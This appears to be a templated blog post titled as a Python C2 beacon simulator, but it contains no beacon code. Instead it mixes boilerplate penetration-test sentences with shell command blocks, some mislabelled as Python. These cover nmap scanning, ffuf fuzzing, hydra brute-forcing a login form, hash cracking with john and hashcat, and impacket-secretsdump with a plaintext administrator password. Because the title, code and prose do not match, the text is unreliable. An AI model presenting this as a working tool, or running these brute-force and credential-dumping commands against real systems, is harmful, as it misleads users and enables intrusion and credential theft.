---
TitleSEO: "C2 Beacon Simulator in Python | ZureFX"
TitlePost: "C2 Beacon Simulator — Python"
Author: "ZureFX"
Description: "A Python script for c2 beacon simulator. Built for security research and automation."
Keywords: "rust, go, c, script, tool, bash, python"
URL: "https://zurefx.github.io/scripting/script-c2-beacon-simulator-369.html"
URL_IMAGES: ""
Date: "2024-09-23"
Tags: "Rust, Go, C, Script, Tool, Bash, Python"
Section: "scripting"
Lang: "en"
main_img: "script-c2-beacon-simulator-369"
Permalink: "/scripting/script-c2-beacon-simulator-369.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `crackmapexec`
- `GetUserSPNs`
- `sqlmap`

## Implementation

### Core Logic

Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

```python
nmap -sCV -p8080,53,139 10.57.90.140 -oN scan.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

### Helper Functions

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.119.30.170/FUZZ
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.118.230.231 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p993,139,25 10.103.35.172 -oN scan.txt
```

### Advanced Options

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.109.136.252 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.54.142.93/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.100.74.37
```

## Output

### Example Output

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

```
[+] Scanning target...
[+] Found 9 results
[+] Done in 20.37s
```
